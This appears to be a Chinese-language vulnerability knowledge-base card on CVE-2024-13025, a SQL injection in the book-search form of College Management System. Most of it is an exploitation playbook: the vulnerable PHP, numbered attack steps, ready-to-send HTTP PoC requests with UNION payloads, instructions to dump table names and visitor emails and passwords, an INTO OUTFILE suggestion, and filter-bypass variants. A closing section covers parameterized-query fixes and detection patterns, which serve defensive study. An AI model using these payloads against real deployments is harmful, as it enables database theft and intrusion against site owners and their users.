---
id: web-generic-sqli-college-mgmt-book-search-post-union
title: College Management System 图书搜索 book_name/book_author 直拼 SELECT：POST 表单 UNION 回显库名版本（faculty.php 与 university.php 同源两处）
type: scenario
domain: web
path: web/generic/sqli
technique: php-book-search-post-form-concat-union
tags:
- php
- mysqli
- sqli
- union
- post-form
- concat
- cve-2024-13025
- college-management
cve:
- CVE-2024-13025
severity: high
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-T2-W2
  verified_at: '2026-11-08T11:52:09+08:00'
  notes: 已对照原文核对：faculty.php 与 university.php 两处 book_name/book_author 直拼 SELECT * FROM book、4 列 UNION 回显 database()/version()、以及 POST 表单字段 search_book 均与原文一致；补充的拖库/OUTFILE/变体段落为合理延伸，原文未验证部分已在卡内标注（OUTFILE 需 FILE 权限，原文未验证）；未执行文中命令与 PoC。未验证点：目标站 mebis 库名与 5.7.26 版本来自原文实测截图，本核对未复现。
url: /docs/web/generic/sqli/web-generic-sqli-college-mgmt-book-search-post-union/
draft: false
kb_aliases:
- CVE-2024-13025
- Codezips College Management System SQL 注入
- college-mgmt-php-master faculty.php 注入
- university.php book_name 注入
- 图书搜索 SQL 注入
- book_name UNION 注入
- search_book 表单注入
---

## 一句话结论

College Management System（PHP 源码版）的图书搜索表单把 `book_name`、`book_author` 两个 `$_POST` 值直接拼进 `SELECT * FROM book WHERE book_name = '$name' AND author = '$author'` 并交给 `mysqli_query()`，没有任何转义或预编译；任意已登录学生/教师（`faculty.php`）或普通页面（`university.php`）可用 `' UNION SELECT ... -- -` 在结果表里回显 `database()`/`version()` 并继续拖库。同一段代码在 `Front-end/` 下被复制到多个页面，`faculty.php` 为主 CVE 入口，`university.php` 是同类未单独收录的入口。

## 原理

- 漏洞代码（`Front-end/faculty.php`、`Front-end/university.php` 中一字不差地重复出现）：
  ```php
  if (isset($_POST['search_book'])) {
      $name   = $_POST['book_name'];
      $author = $_POST['book_author'];
      $query  = "SELECT * FROM book WHERE book_name = '$name' AND author = '$author'";
      $results = mysqli_query($db, $query);
      $row = mysqli_fetch_array($results);
  ?>
  ```
  随后在表格里 `<td><?php echo $row['book_name']; ?></td>` 等位置直接回显查询结果的首行。
- 为什么能注入：`$name`/`$author` 未经过 `mysqli_real_escape_string()`、`prepare()` 或类型转换，直接进入双引号 SQL 字面量；输入里的 `'` 会闭合 `book_name = '` 的字符串，`-- -` 注释掉尾部 `AND author = '...'`，剩余片段成为合法 SQL。
- 为什么能回显：页面把首行四个列值（Book/Author/Campus/Status）逐个打印，因此 `UNION SELECT` 只要对齐 `book` 表的 4 列即可把任意查询结果映射到可见单元格。原文实测表为 4 列，`UNION SELECT NULL,database(),NULL,NULL` 使 Book 列输出库名；`UNION SELECT 1,database(),version(),1` 同时输出库名与 MySQL 版本（如 5.7.26）。
- 为什么两处同源：这是典型的“模板页面复制”缺陷 —— 搜索逻辑被逐页粘贴，修一处漏其余。`search_book` 只是提交按钮名（用于判断表单已提交），`book_author` 在注入 payload 里仍需给一个非空值，否则拼接出的 SQL 会因空字符串闭合而语法错误。
- 前置条件：页面本身要求已登录会话（学生/教师登录后才有导航与搜索表单），但表单处理代码没有二次鉴权/CSRF 校验，只要有 `PHPSESSID` 即可直接 POST。

## 触发条件

- 目标部署了该 CMS 的 `Front-end/faculty.php` 或 `Front-end/university.php`。
- 攻击者持有任意可登录账号的会话（学生或教师），能拿到 `PHPSESSID`。
- 数据库为 MySQL/MariaDB（`database()`、`version()` 为 MySQL 函数），且 `mysqli` 扩展可用（源码即用 `mysqli_query`）。
- 目标未在网关层拦截表单里的单引号/`union`。

## 利用步骤

1. 登录后进入图书搜索页（Faculty → Library / University 页），抓取 `POST /Front-end/faculty.php`，确认表单字段为 `book_name`、`book_author`、`search_book`。
2. 基线：`book_name=test&book_author=test&search_book=`，记录返回的表头与是否命中。
3. 报错/探测：`book_name=x'&book_author=x&search_book=`，若页面报 mysqli 语法错误即确认拼接。
4. 数出列数：从 `UNION SELECT NULL-- -` 起逐个加 `NULL`，直到页面正常渲染；该 CMS 的 `book` 表为 4 列。
5. 取指纹：`book_name=x' UNION SELECT NULL,database(),NULL,NULL-- -`。
6. 继续拖库：`UNION SELECT NULL,group_concat(table_name),NULL,NULL FROM information_schema.tables WHERE table_schema=database()-- -`，再取 `visitor` 表的 `email/password` 等。
7. 换入口复测：同一 payload 对 `POST /Front-end/university.php` 重放，页面同样回显，证明第二处注入点。
8. 若需要写文件，可评估 `UNION SELECT ... INTO OUTFILE`（需 DB 用户有 FILE 权限且知道可写 Web 目录；原文未验证）。

## PoC

`faculty.php`（取库名，4 列）：

```http
POST /college-mgmt-php-master/Front-end/faculty.php HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=<session>

book_name=x'+union+select+NULL,database(),NULL,NULL--+-&book_author=x&search_book=
```

预期：结果表格 Book 单元格显示当前库名（原文环境为 `mebis`）。

`university.php`（取库名 + 版本，同为 4 列）：

```http
POST /college-mgmt-php-master/Front-end/university.php HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=<session>

book_name=a'+union+select+1,database(),version(),1--+-&book_author=a&search_book=
```

预期：Book 列 `1`、Author 列库名、Campus 列 `5.7.26`、Status 列 `1`。

取表名：

```text
book_name=x' UNION SELECT NULL,group_concat(table_name),NULL,NULL FROM information_schema.tables WHERE table_schema=database()-- -
```

注意：`mysqli_query` 对 `-- -` 之后的 `AND author = '...'` 需被完全注释掉，`--` 后必须有空格或 `-`；URL 编码时保持 `--+-`。

## 变体与关联

- 变体：`book_author` 同样是注入点，`book_name` 给正常值、`book_author=x' UNION SELECT ... -- -` 亦可；两个参数在同一 SQL，任一注入即可。
- 变体：若网关只拦 `union`，可换 MySQL 报错注入（`extractvalue(1,concat(0x7e,database()))`）或布尔/时间盲注，因为页面有首行回显与空结果差异，布尔判读容易。
- 变体：该 CMS 的同类页面（学生页 `student.php`、教师页 `lecturer_index.php` 等）多为同一模板复制，审计时应逐个 diff 搜索表单与 `mysqli_query` 拼接点。
- 关联：[[web-generic-sqli-php-like-double-quote-union-outfile]]（PHP 搜索表单拼接 + UNION 的通用形态）。
- 关联：[[web-generic-sqli-metinfo-search-para-base64-blind]]、[[web-generic-sqli-order-by-union-lexicographic-blind]]（同为“首行回显”利用）。
- 关联：[[web-generic-sqli-second-order-injection]]（该站另有注册接口把用户数据入库，后续可形成二阶）。
- 边界：`visitor` 注册逻辑虽然使用 `mysqli_real_escape_string`，但其“前端校验被完全绕过”（邮箱格式、密码长度）只构成弱业务风险，原文只证明了能插入非预期记录，未证明越权或注入，故不单独成卡。

## 检测与防御

- 修复：把两处 `mysqli_query` 改为参数化查询：
  ```php
  $stmt = $db->prepare('SELECT * FROM book WHERE book_name = ? AND author = ?');
  $stmt->bind_param('ss', $name, $author);
  $stmt->execute();
  ```
  或在拼接前统一 `mysqli_real_escape_string($db, $name)`（仅作兜底，不推荐替代预编译）。
- 加固：所有 `$_POST` 使用前做白名单/长度校验；输出到 HTML 时用 `htmlspecialchars()`，避免注入结果被当成可信内容。
- 加固：把重复页面里的搜索逻辑抽成公共函数，避免“修一处漏多处”；上线前对 `mysqli_query($db, "SELECT ... '$var' ...")` 类模式做全量 grep。
- 检测：日志中对 `book_name`/`book_author` 出现 `'`、`union`、`information_schema`、`--`、`select` 组合的请求告警；HTTP 层对同一会话高频、等长、含大量 URL 编码单引号的表单提交告警。
- 通用原则：单引号闭合 + 结果回显是 UNION 注入的教科书条件；参数化查询是唯一可靠修复。
